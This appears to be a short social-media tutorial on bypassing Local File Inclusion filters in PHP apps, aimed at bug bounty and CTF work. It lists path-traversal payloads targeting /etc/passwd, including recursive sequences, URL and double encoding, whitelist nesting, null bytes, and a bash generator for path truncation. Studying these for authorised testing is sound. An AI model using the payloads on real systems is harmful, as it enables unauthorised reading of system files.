## 🛠 LFI Bypass Techniques — From Filters to Null Bytes

> LFI (Local File Inclusion) vulnerabilities can be deadly, but web apps often add filters to prevent exploitation. The good news? Most of them can be bypassed with smart tricks. Here's a full breakdown 👇

#### 🔍 1. Non-Recursive Filters Bypass

Many devs use basic replace filters like:
```
str_replace('../', '', $_GET['file']);
```
✅ Bypass: Use recursive variants like:
```
....//....//etc/passwd
..././..././etc/passwd
....\\\\....\\\\etc/passwd
```
🧠 These payloads escape basic filtering as they don’t get fully cleaned by single-pass filters.

#### 🔐 2. URL Encoding Bypass
If . and / are blocked:
```
%2e%2e%2f = ../
%252e%252e%252f = double encoded ../
```

✅ Try this:
```
language=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
🧠 Use Burp Decoder or python3 -c 'import urllib.parse; print(urllib.parse.quote("../"))'

#### 📁 3. Whitelisted Paths (Regex)
If regex like this is used:
```
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
```

✅ Bypass by nesting:
```
language=./languages/../../../../etc/passwd
```
🧠 Start from approved path and traverse back.

#### 🧩 4. Appended Extension Bypass
Some apps auto-append .php:
```
include($_GET['page'] . '.php');
```
✅ Try reading .php source files (e.g., config.php) ✅ Or use Null Byte Injection on old PHP (<5.5):
```
/etc/passwd%00
```
#### ⚠️ 5. Path Truncation (Legacy Trick)

🧠 In PHP <5.3, strings >4096 chars get truncated.
✅ Payload:
```
non_existing_dir/../../../etc/passwd/././././././././.[repeat ~2048 times]
```
Generate:
```
echo -n "non_existing/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
💡 Other Bypass Tips

▶️Try Null Byte %00 

▶️Mix slashes: \, //, \\\\

▶️Combine encodings + recursive tricks

▶️Brute-force with tools: ffuf, Burp Intruder

📚 LFI bypasses are critical in bug bounty and CTFs. Know your server version, test filters carefully, and automate with payload lists.

📢 For more deep-dive recon & exploit tips, join us at → [@cybersecplayground
](https://t.me/cybersecplayground)
❤️ Like & Share if you learned something new

#bugbounty #LFI #pentesting #exploit #infosec #cybersecurity #crypto #cryptotab
